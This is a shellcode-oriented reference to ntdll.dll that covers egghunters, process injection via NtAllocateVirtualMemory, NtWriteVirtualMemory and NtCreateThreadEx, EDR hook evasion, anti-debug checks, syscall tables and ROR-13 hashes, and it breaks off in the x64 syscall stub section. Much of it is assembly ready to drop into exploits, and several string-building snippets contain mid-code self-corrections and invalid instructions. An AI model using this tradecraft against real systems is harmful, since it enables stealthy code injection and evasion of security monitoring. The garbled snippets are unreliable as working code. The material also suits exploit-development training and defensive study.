# ntdll.dll — Shellcode API Reference

**Library:** `ntdll.dll`
**Base address:** Varies by ASLR; always the *second* module listed in the PEB's `InMemoryOrderModuleList` (after the main executable, before `kernel32.dll`).
**Layer:** Native API — the lowest user-mode interface to the Windows kernel. All Win32 `kernel32.dll` functions ultimately call into `ntdll.dll`, which contains the actual syscall stubs.

---

## Table of Contents

1. [NtAccessCheckAndAuditAlarm — Classic Egghunter Syscall](#ntaccesscheckandauditalarm)
2. [NtDisplayString — SEH Egghunter Syscall](#ntdisplaystring)
3. [NtAllocateVirtualMemory](#ntallocatevirtualmemory)
4. [NtWriteVirtualMemory](#ntwritevirtualmemory)
5. [NtCreateThreadEx](#ntcreatethreadex)
6. [NtProtectVirtualMemory](#ntprotectvirtualmemory)
7. [RtlAllocateHeap](#rtlallocateheap)
8. [RtlCopyMemory / RtlZeroMemory / RtlFillMemory](#rtlcopymemory--rtlzeromemory--rtlfillmemory)
9. [LdrLoadDll / LdrGetProcedureAddress](#ldrloaddll--ldrgetprocedureaddress)
10. [NtQueryInformationProcess](#ntqueryinformationprocess)
11. [Syscall Stub Structure](#syscall-stub-structure)
12. [Syscall Number Tables](#syscall-number-tables)
13. [Why Shellcode Targets kernel32 First](#why-shellcode-targets-kernel32-first)
14. [Direct Syscall Invocation](#direct-syscall-invocation)
15. [NTAPI Calling Convention](#ntapi-calling-convention)
16. [ROR-13 Hash Quick Reference](#ror-13-hash-quick-reference)

---

## Background: ntdll Architecture

`ntdll.dll` occupies a unique position in the Windows architecture:

```
User Mode:
  Application
      ↓
  Win32 API (kernel32.dll, user32.dll, advapi32.dll ...)
      ↓
  Native API (ntdll.dll) ← syscall stubs live here
      ↓  [syscall instruction / INT 0x2E / SYSENTER]
Kernel Mode:
  ntoskrnl.exe (NT kernel)
```

Functions prefixed `Nt` or `Zw` are syscall stubs. Functions prefixed `Rtl` ("Runtime Library") are pure user-mode utility routines with no syscall. Functions prefixed `Ldr` ("Loader") manage the PE loader.

### Nt vs. Zw Prefixes

In user mode, `NtXxx` and `ZwXxx` are **identical** — they point to the same syscall stub. In kernel mode, `ZwXxx` always sets the `PreviousMode` to `KernelMode`, bypassing access checks. In shellcode context, the distinction is irrelevant — use whichever variant you find in the export table.

---

## NtAccessCheckAndAuditAlarm

### Purpose and Use in Egghunters

`NtAccessCheckAndAuditAlarm` is used in the classic 32-byte `x86` egghunter authored by **skape** (Matt Miller) because:

1. Its syscall number is **`0x02`** across all major x86 Windows releases (XP through 7, regardless of service pack).
2. When called with an invalid pointer as one of its arguments, the kernel validates the pointer and returns `STATUS_ACCESS_VIOLATION (0xC0000005)` rather than crashing the process.
3. It requires no setup of complex structures — the egghunter only needs the kernel to dereference an address and report whether it's valid.

### Syscall Number Stability

| Windows Version | `NtAccessCheckAndAuditAlarm` syscall # |
|---|---|
| XP SP0/SP1/SP2/SP3 | `0x02` |
| Server 2003 | `0x02` |
| Vista | `0x02` |
| 7 (x86) | `0x02` |
| 8 / 8.1 | `0x02` |
| 10 (x86, early builds) | `0x02` |

This stability makes it the preferred egghunter syscall: a single assembly sequence works across all relevant 32-bit targets without a version check.

### C Prototype (11 arguments)

```c
NTSTATUS NtAccessCheckAndAuditAlarm(
    PUNICODE_STRING SubsystemName,           // [in]
    PVOID           HandleId,                // [in]
    PUNICODE_STRING ObjectTypeName,          // [in]
    PUNICODE_STRING ObjectName,              // [in]
    PSECURITY_DESCRIPTOR SecurityDescriptor, // [in]
    ACCESS_MASK     DesiredAccess,           // [in]
    PGENERIC_MAPPING GenericMapping,         // [in]
    BOOLEAN         ObjectCreation,          // [in]
    PACCESS_MASK    GrantedAccess,           // [out]
    PBOOLEAN        AccessStatus,            // [out]
    PBOOLEAN        GenerateOnClose          // [out]
);
```

**Shellcode only cares about the fault behavior.** None of the 11 arguments are meaningfully set; the egghunter passes the address being probed as `SubsystemName` (a pointer that must be valid for the call to succeed). If the address is unmapped, the kernel page-faults internally and returns `STATUS_ACCESS_VIOLATION`.

### 32-Byte Egghunter — skape/NtAccessCheckAndAuditAlarm

The egg is a 4-byte tag repeated twice: `"\x90\x50\x90\x50"` (or any tag not present in the egghunter itself). The egghunter scans virtual memory, using the syscall to test each page.

```nasm
; ============================================================
; 32-byte NtAccessCheckAndAuditAlarm egghunter
; Egg: 0x50905090 (tag repeated twice = 8 bytes before shellcode)
; ============================================================
; Assemble with: nasm -f bin egghunter.asm -o egghunter.bin
; ============================================================

BITS 32

egg equ 0x50905090      ; 4-byte egg tag

egghunter:
    xor  edx, edx           ; EDX = current address to probe (start at 0)

next_page:
    or   dx, 0x0FFF         ; round EDX down to page boundary - 1 (align to 0xXXXX0FFF)
                             ; adding 1 below bumps to next page start

next_addr:
    inc  edx                ; EDX++ (first time: EDX = 0x00001000)

    ; --- Test if EDX is a valid mapped address ---
    push edx                ; push address to probe as SubsystemName argument
    push edx                ; (NtAccessCheckAndAuditAlarm needs at least arg on stack)
                             ; We're abusing the stub — just need a syscall with EDX as ref
    ; Invoke NtAccessCheckAndAuditAlarm syscall directly
    push 0x02               ; syscall number
    pop  eax                ; EAX = 0x02
    mov  edx, esp           ; EDX = pointer to args on stack (KiIntSystemCall wants this)
    ; On XP/2003 (non-sysenter):
    int  0x2E               ; syscall via software interrupt
    ; EAX = NTSTATUS result
    pop  edx                ; restore EDX (the probed address, now popped from stack)
    pop  edx                ; pop the duplicate push

    ; Check for STATUS_ACCESS_VIOLATION (0xC0000005)
    ; The comparison trick: mask off low byte and check the known pattern
    cmp  al, 0x05           ; STATUS_ACCESS_VIOLATION low byte
    je   next_page          ; bad address — skip entire page

    ; Page is valid — search for egg tag
    cmp  dword [edx], egg   ; first 4 bytes == egg?
    jne  next_addr
    cmp  dword [edx+4], egg ; second 4 bytes == egg?
    jne  next_addr

    ; Found egg — shellcode starts at EDX+8
    jmp  edx                ; jump to shellcode (egg is prepended, code starts at EDX)
```

> **Note:** The canonical skape implementation uses `INT 0x2E` for XP compatibility and the specific instruction encoding keeps the total at 32 bytes. The version above is functionally equivalent but slightly annotated for clarity; byte counts may differ. For a production 32-byte version, use the original from the paper *"Safely Searching Process Virtual Address Space"* (skape, 2004).

### Sysenter Variant (XP SP2+)

On XP SP2 and later, the preferred syscall mechanism is `SYSENTER` rather than `INT 0x2E`. The `KiFastSystemCall` stub in `ntdll.dll` handles this:

```nasm
; KiFastSystemCall stub (ntdll, XP SP2+):
;   mov edx, esp
;   sysenter
;   ret
```

The egghunter can call `KiFastSystemCall` instead of `INT 0x2E` if the address is known, but `INT 0x2E` works on all versions (it's slower but universal).

---

## NtDisplayString

### Purpose and Use in SEH Egghunters

`NtDisplayString` prints a `UNICODE_STRING` to the screen. Its primary use in exploit development is as the syscall target in **SEH-based egghunters** (a variation popularized in OSED training material).

### Syscall Number Instability

| Windows Version | `NtDisplayString` syscall # |
|---|---|
| XP SP2 (x86) | `0xAD` |
| XP SP3 (x86) | `0xAD` |
| Vista SP0 | `0xB5` |
| Vista SP2 | `0xB5` |
| 7 SP0 (x86) | `0xB2` |
| 7 SP1 (x86) | `0xB2` |
| 8 / 8.1 | changes |

The syscall number is **not stable** across Windows versions, which is why the SEH approach compensates: the SEH handler catches any `STATUS_ACCESS_VIOLATION` (or invalid syscall number resulting in an exception) transparently.

### SEH-Based Egghunter Assembly

```nasm
; ============================================================
; SEH-based egghunter
; Uses a structured exception handler to catch AVs instead of
; relying on syscall-validated pointer checks.
; Egg: 0x50905090 repeated twice.
; ============================================================
BITS 32

egg equ 0x50905090

egghunter_seh:
    jmp  setup_seh           ; jump over the SEH handler

seh_handler:
    ; SEH handler: called when an exception occurs
    ; ExceptionRecord is on stack; we just want to skip the faulting instruction
    ; Advance EIP past the faulting instruction by manipulating the context
    pop  eax                 ; clean stack
    pop  eax                 ; (simplified — real SEH handler receives structured args)
    xor  eax, eax
    ret

setup_seh:
    ; Install SEH frame
    xor  eax, eax
    push offset seh_handler  ; SEH handler pointer
    push dword fs:[eax]      ; previous SEH frame pointer
    mov  fs:[eax], esp       ; install new SEH frame

    xor  edx, edx            ; current probe address

next_page_seh:
    or   dx, 0x0FFF

next_addr_seh:
    inc  edx
    mov  eax, 0x00905090     ; partial egg (check before full dword compare)
    ; (probe via direct dereference — SEH catches the AV if unmapped)
    cmp  dword [edx], egg
    jne  next_addr_seh
    cmp  dword [edx+4], egg
    jne  next_addr_seh

    ; Uninstall SEH frame
    xor  eax, eax
    mov  eax, dword fs:[eax]
    mov  eax, [eax]
    mov  dword fs:[0], eax   ; (simplified frame removal)

    ; Jump to shellcode
    add  edx, 8
    jmp  edx
```

> **Important:** The above is illustrative pseudo-assembly. A production SEH egghunter requires carefully crafted SEH frame installation that passes OS exception dispatcher validation (SafeSEH, SEHOP). On modern Windows, SEH chains must be registered or exploitation of the handler is blocked. For unprotected (non-SafeSEH) modules, the simple frame install works.

### Why SEH Instead of NtAccessCheckAndAuditAlarm

Use the SEH egghunter when:
- The target runs Windows Vista or later where syscall numbers are unpredictable.
- The target binary has exception handling already in use that makes a syscall-based check unreliable.

Use `NtAccessCheckAndAuditAlarm` when:
- The target is Windows XP/2003 (guaranteed syscall 0x02).
- Code size is constrained to exactly 32 bytes.

---

## NtAllocateVirtualMemory

### C Prototype

```c
NTSTATUS NtAllocateVirtualMemory(
    HANDLE     ProcessHandle,    // -1 for current process
    PVOID     *BaseAddress,      // [in/out] preferred base (or NULL); receives actual base
    ULONG_PTR  ZeroBits,         // 0 = no constraint on high address bits
    PSIZE_T    RegionSize,       // [in/out] requested size; receives actual (page-aligned) size
    ULONG      AllocationType,   // MEM_COMMIT | MEM_RESERVE = 0x3000
    ULONG      Protect           // PAGE_EXECUTE_READWRITE = 0x40
);
```

**Syscall numbers:**

| Version | Syscall # |
|---|---|
| XP SP0–SP3 | `0x89` |
| Vista | `0x13` |
| 7 | `0x15` |
| 8.1 | `0x18` |
| 10 (1507) | `0x18` |
| 10 (1903+) | `0x18` |

**ROR-13 hash:** `0x938B4BCF`
**Bad characters in hash:** `\xCF` — high byte; verify against filter.

### Relationship to VirtualAlloc

`VirtualAlloc` (kernel32) is a thin wrapper that:
1. Calls `NtAllocateVirtualMemory`.
2. Translates `NTSTATUS` return to `BOOL/NULL`.
3. Handles the `BaseAddress` in/out pointer internally.

Shellcode targets `NtAllocateVirtualMemory` directly to:
- Avoid the kernel32 import step (useful if kernel32 is hooked by EDR).
- Work in contexts where only ntdll is mapped (early process injection, before kernel32 load).

### Key Differences from VirtualAlloc

| Parameter | `VirtualAlloc` | `NtAllocateVirtualMemory` |
|---|---|---|
| Process handle | Implicit (current) | Explicit (`-1` for current) |
| `BaseAddress` | Return value | In/out pointer (must point to a `PVOID`) |
| `ZeroBits` | Not exposed | Must be `0` in shellcode |
| `RegionSize` | Direct `SIZE_T` | Pointer to `SIZE_T` |

### x86 Push Sequence

```nasm
; NtAllocateVirtualMemory(-1, &base_var, 0, &size_var, 0x3000, 0x40)
; base_var and size_var must be pre-allocated (e.g., on the stack)

sub  esp, 8         ; allocate space for base_var (4 bytes) and size_var (4 bytes)
mov  ebp, esp       ; EBP = &base_var

xor  eax, eax
mov  [ebp+0], eax   ; base_var = NULL (OS chooses address)
mov  dword [ebp+4], 0x1000  ; size_var = 0x1000 bytes

push 0x40           ; Protect = PAGE_EXECUTE_READWRITE
push 0x3000         ; AllocationType = MEM_COMMIT|MEM_RESERVE
lea  eax, [ebp+4]
push eax            ; &RegionSize
push 0              ; ZeroBits = 0
lea  eax, [ebp+0]
push eax            ; &BaseAddress
push 0xFFFFFFFF     ; ProcessHandle = -1 (current process)

; Invoke via resolved function pointer:
call [NtAllocateVirtualMemory_ptr]
; NTSTATUS in EAX; 0 = STATUS_SUCCESS
; [ebp+0] now holds the allocated base address
```

---

## NtWriteVirtualMemory

### C Prototype

```c
NTSTATUS NtWriteVirtualMemory(
    HANDLE      ProcessHandle,         // target process (-1 for self, or from OpenProcess)
    PVOID       BaseAddress,           // destination address in target
    PVOID       Buffer,                // source buffer (local address)
    ULONG       NumberOfBytesToWrite,  // byte count
    PULONG      NumberOfBytesWritten   // [out, optional] NULL
);
```

**Syscall numbers:**

| Version | Syscall # |
|---|---|
| XP SP0–SP3 | `0x115` |
| Vista | `0x37` |
| 7 | `0x3A` |
| 8.1 | `0x3E` |
| 10 (1903+) | `0x3A` |

### Relationship to WriteProcessMemory

`WriteProcessMemory` (kernel32) calls `NtWriteVirtualMemory`. In injection shellcode, calling the native function directly avoids API monitoring hooks placed at the kernel32 level by AV/EDR.

### x86 Push Sequence

```nasm
; NtWriteVirtualMemory(hProcess, remote_addr, local_shellcode, len, NULL)
xor  eax, eax
push eax                    ; NumberOfBytesWritten = NULL
push dword [shellcode_len]
push dword [local_shellcode_ptr]
push dword [remote_addr]
push dword [hProcess]
call [NtWriteVirtualMemory_ptr]
```

---

## NtCreateThreadEx

### C Prototype (Vista+)

```c
NTSTATUS NtCreateThreadEx(
    PHANDLE             ThreadHandle,        // [out] receives thread HANDLE
    ACCESS_MASK         DesiredAccess,       // THREAD_ALL_ACCESS = 0x1FFFFF
    POBJECT_ATTRIBUTES  ObjectAttributes,    // NULL
    HANDLE              ProcessHandle,       // target process handle
    PVOID               StartRoutine,        // shellcode address in remote process
    PVOID               Argument,            // NULL (passed to thread function)
    ULONG               CreateFlags,         // 0 = run immediately; 0x1 = CREATE_SUSPENDED
    SIZE_T              ZeroBits,            // 0
    SIZE_T              StackSize,           // 0 = default
    SIZE_T              MaximumStackSize,    // 0 = default
    PPS_ATTRIBUTE_LIST  AttributeList        // NULL
);
```

**Availability:** Windows Vista and later. Does **not** exist on XP (use `RtlCreateUserThread` on XP, or `CreateRemoteThread` which calls `NtCreateThreadEx` on Vista+).

**Syscall numbers:**

| Version | Syscall # |
|---|---|
| Vista | `0xAF` |
| 7 | `0xB0` |
| 8.1 | `0xBD` |
| 10 (1507) | `0xBD` |
| 10 (1903+) | `0xC1` |

### Why NtCreateThreadEx for Injection

- `CreateRemoteThread` calls `NtCreateThreadEx` on Vista+.
- `NtCreateThreadEx` allows `CreateFlags = 0x4` (`THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER`), which hides the thread from debugger notifications — commonly used in stealthy shellcode loaders.
- Direct `NtCreateThreadEx` invocation bypasses kernel32-level hooks in EDR products.

### x86 Push Sequence (Injection)

```nasm
; NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, RemoteStart, NULL, 0, 0, 0, 0, NULL)
sub  esp, 4          ; space for hThread output
mov  ebp, esp        ; EBP = &hThread

xor  eax, eax
push eax             ; AttributeList = NULL
push eax             ; MaximumStackSize = 0
push eax             ; StackSize = 0
push eax             ; ZeroBits = 0
push eax             ; CreateFlags = 0 (run immediately)
push eax             ; Argument = NULL
push dword [remote_start]   ; StartRoutine
push dword [hProcess]       ; ProcessHandle
push eax             ; ObjectAttributes = NULL
push 0x1FFFFF        ; DesiredAccess = THREAD_ALL_ACCESS
push ebp             ; &ThreadHandle (output)
call [NtCreateThreadEx_ptr]
```

---

## NtProtectVirtualMemory

### C Prototype

```c
NTSTATUS NtProtectVirtualMemory(
    HANDLE  ProcessHandle,      // -1 for current
    PVOID  *BaseAddress,        // [in/out] pointer to region start
    PSIZE_T RegionSize,         // [in/out] pointer to region size
    ULONG   NewProtect,         // e.g., PAGE_EXECUTE_READWRITE = 0x40
    PULONG  OldProtect          // [out] receives previous protection
);
```

**Syscall numbers:**

| Version | Syscall # |
|---|---|
| XP SP0–SP3 | `0x89` (`NtAllocateVirtualMemory` shares this; verify) |
| Vista | `0x4F` |
| 7 | `0x4D` |
| 8.1 | `0x50` |
| 10 (1903+) | `0x50` |

**ROR-13 hash:** `0x4E6B8594`
**Bad characters in hash:** `\x94` — high byte; `\x85` — `TEST EAX,EAX` opcode, usually not a problem in data context. Neither is a universal bad char.

### Use in ROP Chains Targeting ntdll

Some DEP-bypass ROP chains target `NtProtectVirtualMemory` rather than `VirtualProtect` because:
- On EDR-monitored systems, hooks on `VirtualProtect` may log the call; ntdll-level hooks are less common.
- The ntdll function pointer is more stable in certain gadget compositions.

The `BaseAddress` and `RegionSize` in/out parameters require pre-allocated pointer variables, which complicates the PUSHAD trick. A common workaround is to build the in/out variables in a writable `.data` section and patch them during ROP chain construction.

### x86 Push Sequence

```nasm
; NtProtectVirtualMemory(-1, &base, &size, 0x40, &old_protect)
; Assumes base, size, old_protect variables pre-allocated in writable memory
lea  eax, [old_protect_var]
push eax                    ; OldProtect
push 0x40                   ; NewProtect = PAGE_EXECUTE_READWRITE
lea  eax, [size_var]        ; size_var initialized to shellcode size
push eax                    ; &RegionSize
lea  eax, [base_var]        ; base_var initialized to shellcode start address
push eax                    ; &BaseAddress
push 0xFFFFFFFF             ; ProcessHandle = current process
call [NtProtectVirtualMemory_ptr]
```

---

## RtlAllocateHeap

### C Prototype

```c
PVOID RtlAllocateHeap(
    PVOID  HeapHandle,  // heap handle (from RtlCreateHeap or PEB.ProcessHeap)
    ULONG  Flags,       // 0 = default; HEAP_ZERO_MEMORY = 0x8
    SIZE_T Size         // bytes to allocate
);
```

**No syscall** — pure user-mode routine. `kernel32!HeapAlloc` is a wrapper around `ntdll!RtlAllocateHeap`.

### Getting the Process Heap Without kernel32

Shellcode targeting ntdll directly can obtain the default heap handle from the PEB without calling `GetProcessHeap()`:

```nasm
; Get default heap from PEB (no kernel32 needed)
xor  eax, eax
mov  eax, fs:[eax+0x30]     ; EAX = PEB
mov  eax, [eax+0x18]        ; EAX = PEB.ProcessHeap (offset 0x18 on x86)

; RtlAllocateHeap(ProcessHeap, 0, 0x200)
push 0x200                  ; Size
push 0                      ; Flags
push eax                    ; HeapHandle
call [RtlAllocateHeap_ptr]
; EAX = allocated pointer or NULL
```

### When Shellcode Uses RtlAllocateHeap

- When only ntdll is resolved (early injection stage, before kernel32 is loaded).
- When avoiding the extra indirection of `HeapAlloc → RtlAllocateHeap`.
- In shellcode that builds its own import resolution using only ntdll exports.

---

## RtlCopyMemory / RtlZeroMemory / RtlFillMemory

### Prototypes

```c
// RtlCopyMemory — does NOT handle overlapping buffers (unlike RtlMoveMemory)
VOID RtlCopyMemory(
    PVOID       Destination,
    const VOID *Source,
    SIZE_T      Length
);

// RtlZeroMemory — fill with 0x00
VOID RtlZeroMemory(
    PVOID   Destination,
    SIZE_T  Length
);

// RtlFillMemory — fill with arbitrary byte
VOID RtlFillMemory(
    PVOID   Destination,
    SIZE_T  Length,
    UCHAR   Fill         // byte value to fill
);
```

### Implementation Notes

On x86 Windows, these are typically:
- `RtlCopyMemory` → `memcpy` (or `rep movsd` loop internally).
- `RtlMoveMemory` → `memmove` (handles overlap).
- `RtlZeroMemory` → `memset(dst, 0, len)`.
- `RtlFillMemory` → `memset(dst, fill, len)`.

In Windows SDK headers, `RtlCopyMemory` and `RtlMoveMemory` are often macro aliases. In `ntdll.dll`'s export table both are actual exported functions pointing to the same or nearly identical code.

### Zeroing STARTUPINFOA Without kernel32

In shellcode building a reverse shell without kernel32, `RtlZeroMemory` from ntdll zeroes the `STARTUPINFOA` struct:

```nasm
; Zero STARTUPINFOA on stack
sub  esp, 0x44          ; reserve STARTUPINFOA
mov  edi, esp           ; EDI = start of struct

push 0x44               ; Length = sizeof(STARTUPINFOA)
push edi                ; Destination
call [RtlZeroMemory_ptr]
```

Or inline without a function call (saves the resolution overhead):

```nasm
sub  esp, 0x44
xor  eax, eax
mov  ecx, 0x11          ; 0x44 / 4 = 17
lea  edi, [esp]
rep  stosd              ; zero 17 DWORDs = 68 bytes
```

The inline `rep stosd` is common in size-constrained shellcode where resolving `RtlZeroMemory` isn't worth the overhead.

---

## LdrLoadDll / LdrGetProcedureAddress

### Why Target ntdll Loader Functions

`LoadLibraryA` (kernel32) internally calls `LdrLoadDll` (ntdll). Targeting the ntdll function directly:
- Bypasses kernel32-level hooks on `LoadLibraryA`.
- Avoids kernel32 resolution entirely in shellcode that only resolves ntdll.
- Required when shellcode runs before kernel32 is initialized.

### LdrLoadDll Prototype

```c
NTSTATUS LdrLoadDll(
    PWSTR               PathToFile,      // NULL = use default search path
    PULONG              Flags,           // NULL or pointer to 0
    PUNICODE_STRING     ModuleFileName,  // UNICODE_STRING of DLL name
    PHANDLE             ModuleHandle     // [out] DLL base address
);
```

**Key difference from LoadLibraryA:** The DLL name must be a `UNICODE_STRING` (wide characters), not an ANSI `char*`.

### UNICODE_STRING Layout

```c
typedef struct _UNICODE_STRING {
    USHORT Length;         // byte length of string (not including null terminator)
    USHORT MaximumLength;  // buffer capacity in bytes (usually Length + 2)
    PWSTR  Buffer;         // pointer to wide-char string (UTF-16LE)
} UNICODE_STRING;
// sizeof(UNICODE_STRING) = 8 bytes (x86)
```

Building "ws2_32.dll" as a `UNICODE_STRING` on the stack:

```nasm
; Build L"ws2_32.dll\0" in UTF-16LE on the stack
; "ws2_32.dll" = 10 chars = 20 bytes + 2 null = 22 bytes total
; In UTF-16LE each char is 2 bytes: 'w'=0x7700, 's'=0x7300, etc.

; Push null terminator first (stack grows downward)
xor   eax, eax
push  eax               ; 0x00000000 — wide null terminator

; Push "dll" in reverse order (wide chars)
push  0x006C006C        ; "ll" in UTF-16LE (little-endian storage)
push  0x0064002E        ; ".d"
push  0x0032005F        ; "_2"
push  0x0032003200      ; "22" — wait, verify encoding

; Correct UTF-16LE for "ws2_32.dll":
; w=0x0077, s=0x0073, 2=0x0032, _=0x005F, 3=0x0033, 2=0x0032, .=0x002E, d=0x0064, l=0x006C, l=0x006C
; As DWORDs (push from end to start):
;   "ll" → 0x006C006C
;   "dl" → 0x006C0064 (push 'd' first since stack grows down)
;   ".d" → push 0x0064002E
;   "2." → push 0x002E0032
;   "32" → push 0x00320033
;   "_3" → push 0x0033005F
;   "2_" → push 0x005F0032
;   "s2" → push 0x00320073
;   "ws" → push 0x00730077

; After all pushes, ESP points to start of "ws2_32.dll\0" in UTF-16LE
mov  edi, esp           ; EDI = wide string pointer

; Build UNICODE_STRING struct
push edi                ; Buffer pointer
push word 0x0016        ; MaximumLength = 22 (10 chars * 2 + 2)
; Actually UNICODE_STRING.MaximumLength occupies the same WORD as Length in packed layout;
; push as DWORD:  MaximumLength(hi WORD) | Length(lo WORD)
; Length = 20 bytes (10 wide chars, no null), MaximumLength = 22
push dword 0x00160014   ; MaximumLength=0x0016, Length=0x0014
; Wait: UNICODE_STRING layout is Length (USHORT, +0), MaximumLength (USHORT, +2), Buffer (PVOID, +4)
; On little-endian x86, push DWORD 0x00160014 stores: [+0]=0x14, [+2]=0x16 → correct!
push edi                ; Buffer at offset +4
mov  ebp, esp           ; EBP = &UNICODE_STRING

; --- Call LdrLoadDll ---
sub  esp, 4             ; space for ModuleHandle output
mov  esi, esp           ; ESI = &ModuleHandle

xor  eax, eax
push esi                ; ModuleHandle (out)
push ebp                ; ModuleFileName (UNICODE_STRING*)
push eax                ; Flags = NULL
push eax                ; PathToFile = NULL
call [LdrLoadDll_ptr]
; EAX = NTSTATUS (0 = success)
; [ESI] = DLL base address (HMODULE equivalent)
```

### LdrGetProcedureAddress Prototype

```c
NTSTATUS LdrGetProcedureAddress(
    PVOID           ModuleHandle,    // DLL base address
    PANSI_STRING    FunctionName,    // ANSI_STRING (not UNICODE_STRING!) or NULL
    ULONG           Ordinal,         // ordinal if FunctionName is NULL
    PVOID          *FunctionAddress  // [out] function pointer
);
```

Note: `LdrGetProcedureAddress` takes an `ANSI_STRING` (not `UNICODE_STRING`) for the function name. `ANSI_STRING` has the same layout as `UNICODE_STRING` but with `char*` buffer:

```c
typedef struct _ANSI_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PSTR   Buffer;        // char*, not PWSTR
} ANSI_STRING;
```

```nasm
; Build ANSI_STRING for "WSAStartup\0"
; "WSAStartup" = 10 chars
; Push string bytes then build struct

xor  eax, eax
push eax                ; null terminator
push 0x70757472        ; "rtup" reversed: 0x70757472
push 0x61745341        ; "StaS" — verify: 'S'=0x53,'t'=0x74,'a'=0x61,'S'? No: "ASta"
; Correct: "WSAStartup"
; W=0x57, S=0x53, A=0x41, S=0x53, t=0x74, a=0x61, r=0x72, t=0x74, u=0x75, p=0x70
; Push in reverse groups of 4:
; "rtup" → push 0x70757472   (p=70, u=75, t=74, r=72)
; "Asta" → push 0x61747341
; "WSA\0"→ problematic null... push "WS" then single bytes or xor trick

push 0x70757472         ; "purt" reversed → actual bytes at [esp]: 72 74 75 70 = "rtup"
push 0x61745341         ; actual bytes: 41 53 74 61 = "ASta"
push 0x00415357         ; "WSA\0" — null byte in instruction encoding!
; Fix: XOR approach
mov  eax, 0x01425458    ; 0x00415357 XOR 0x01010101 = ?
                         ; 0x01^0x00=0x01, 0x42^0x41=0x03... doesn't work cleanly.
; Simpler: build on stack with byte stores
sub  esp, 12
mov  byte [esp+0], 'W'
mov  byte [esp+1], 'S'
mov  byte [esp+2], 'A'
mov  byte [esp+3], 'S'
mov  byte [esp+4], 't'
mov  byte [esp+5], 'a'
mov  byte [esp+6], 'r'
mov  byte [esp+7], 't'
mov  byte [esp+8], 'u'
mov  byte [esp+9], 'p'
mov  byte [esp+10], 0   ; null terminator (data store, not instruction encoding)
mov  edi, esp

; ANSI_STRING struct (as DWORD: MaximumLength|Length then Buffer)
push edi                ; Buffer
push dword 0x000B000A   ; MaximumLength=0x0B(11), Length=0x0A(10)
mov  ebx, esp           ; EBX = &ANSI_STRING

; LdrGetProcedureAddress(hModule, &ansi_str, 0, &fn_ptr)
sub  esp, 4
mov  esi, esp           ; ESI = &fn_ptr output
push esi                ; FunctionAddress (out)
push 0                  ; Ordinal = 0 (use name)
push ebx                ; FunctionName (ANSI_STRING*)
push dword [ws2_hmod]   ; ModuleHandle
call [LdrGetProcedureAddress_ptr]
```

**ROR-13 hash:** `LdrLoadDll = 0x185C8CA7`
**Bad characters:** `\xA7` — high byte.

---

## NtQueryInformationProcess

### C Prototype

```c
NTSTATUS NtQueryInformationProcess(
    HANDLE           ProcessHandle,           // -1 for current
    PROCESSINFOCLASS ProcessInformationClass, // query type (enum)
    PVOID            ProcessInformation,      // [out] buffer
    ULONG            ProcessInformationLength,// buffer size
    PULONG           ReturnLength             // [out, optional] bytes written
);
```

**Syscall numbers:**

| Version | Syscall # |
|---|---|
| XP SP0–SP3 | `0x9A` |
| Vista | `0x22` |
| 7 | `0x23` |
| 8.1 | `0x28` |
| 10 (1903+) | `0x19` |

### Anti-Debug Detection with ProcessDebugPort

`ProcessDebugPort (7)` queries whether the process is being debugged. The kernel sets the debug port to a non-zero value when a debugger is attached.

```nasm
; NtQueryInformationProcess(-1, ProcessDebugPort=7, &result, 4, NULL)
sub  esp, 4
mov  ebp, esp           ; EBP = output buffer

xor  eax, eax
push eax                ; ReturnLength = NULL
push 4                  ; ProcessInformationLength = sizeof(DWORD)
push ebp                ; ProcessInformation (output DWORD)
push 7                  ; ProcessInformationClass = ProcessDebugPort
push 0xFFFFFFFF         ; ProcessHandle = -1 (current)
call [NtQueryInformationProcess_ptr]

; Check result
pop  eax                ; EAX = DebugPort value
test eax, eax
jnz  debugger_detected  ; non-zero → debugger attached

; ... continue normal shellcode execution ...

debugger_detected:
    ; Options: sleep forever, exit cleanly, or do nothing suspicious
    xor  eax, eax
    dec  eax            ; EAX = -1
    push eax
    push eax
    call [TerminateProcess_ptr]
```

### Additional ProcessInformationClass Values

| Class | Value | Query |
|---|---|---|
| `ProcessBasicInformation` | `0` | PID, parent PID, PEB pointer |
| `ProcessDebugPort` | `7` | Non-zero if debugger attached |
| `ProcessWow64Information` | `26` | Non-null if 32-bit on 64-bit OS |
| `ProcessImageFileName` | `27` | Full path of process executable |
| `ProcessDebugObjectHandle` | `30` | Debug object handle |
| `ProcessDebugFlags` | `31` | `0` = inherit debug; `1` = no inherit |

`ProcessDebugObjectHandle (30)` and `ProcessDebugFlags (31)` are Vista+ additions that provide more granular debugging state. Shellcode with anti-debug checks may query all three (7, 30, 31) to detect various debugger configurations.

---

## Syscall Stub Structure

### x86 Syscall Mechanisms by Windows Version

Windows uses different mechanisms to transition from user mode to kernel mode across versions:

#### Windows NT 3.1 – NT 4.0: `INT 0x2E`

```nasm
; ntdll syscall stub (pre-XP):
mov  eax, <syscall_number>
lea  edx, [esp+4]       ; EDX = pointer to first argument
int  0x2E               ; software interrupt → KiSystemService
ret  <arg_bytes>        ; stdcall cleanup
```

#### Windows XP SP0 – SP1: `INT 0x2E` still default; `SYSENTER` available

```nasm
; KiFastSystemCall (ntdll, XP SP1+):
mov  edx, esp
sysenter
```

The stub evolved to:

```nasm
; ntdll syscall stub (XP SP1+):
mov  eax, <syscall_number>
mov  edx, 0x7FFE0300    ; KUSER_SHARED_DATA.SystemCall pointer
call dword [edx]        ; calls KiFastSystemCall (sysenter) or KiIntSystemCall (int 2E)
ret  <arg_bytes>
```

`0x7FFE0300` is the `SystemCall` field of `KUSER_SHARED_DATA`, which the kernel maps read-only at a fixed address in every process. Its value points to either `KiFastSystemCall` (`sysenter`) or `KiIntSystemCall` (`int 0x2E`) depending on CPU capability.

#### Windows Vista – 7 (x86): `SYSENTER` universal

```nasm
; ntdll syscall stub (Vista/7, x86):
mov  eax, <syscall_number>
xor  ecx, ecx
lea  edx, [esp+4]       ; or: mov edx, esp
call dword fs:[0xC0]    ; TEB.WoW64Reserved / alternate dispatch
; Some builds use: call 0x7FFE0300
sysenter
; ... return path ...
```

#### Windows 8+ (x86): Direct `sysenter`

```nasm
; ntdll syscall stub (Win8+, x86):
mov  eax, <syscall_number>
call _KiFastSystemCall
; where _KiFastSystemCall:
;   mov edx, esp
;   sysenter
;   ret
```

#### x64 (All Versions from Vista): `syscall` instruction

```nasm
; ntdll syscall stub (x64):
mov  r10, rcx           ; save RCX (first arg) in R10 (kernel ABI requires this)
